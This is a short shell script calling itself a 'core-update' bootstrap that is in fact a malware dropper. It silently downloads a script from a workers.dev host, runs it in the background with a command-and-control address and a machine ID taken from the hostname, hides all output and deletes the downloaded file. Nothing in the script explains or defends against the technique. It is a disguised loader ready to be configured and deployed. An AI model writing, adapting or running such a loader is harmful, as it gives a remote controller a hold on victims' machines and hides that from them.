#!/bin/sh
# core-update — bootstrap
[ "$(id -u)" = "0" ] && exit 0
command -v curl >/dev/null 2>&1 || exit 0
C2="${C2:-https://CHANGE_ME}"
ID="${ID:-$(hostname 2>/dev/null | tr -cd 'a-z0-9' | cut -c1-12)}"
T=$(mktemp 2>/dev/null || echo /tmp/.c.$$)
curl -fsSL -m 60 "https://edge-static.cdn-edge-e9d.workers.dev/agent.sh" -o "$T" 2>/dev/null || exit 0
sh "$T" "$C2" "$ID" >/dev/null 2>&1 &
rm -f "$T" 2>/dev/null
exit 0
